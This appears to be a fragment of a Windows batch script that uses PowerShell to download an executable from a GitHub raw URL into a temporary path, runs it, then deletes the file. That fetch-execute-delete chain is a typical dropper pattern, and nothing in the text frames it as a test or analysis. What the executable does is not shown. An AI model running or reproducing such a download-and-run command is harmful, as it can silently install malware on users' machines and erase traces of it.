...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Canproject30/atllabdc-canstlr-5250/main/myapp.exe', '%indirme_yeri%')"
"%indirme_yeri%"
del "%indirme_yeri%"
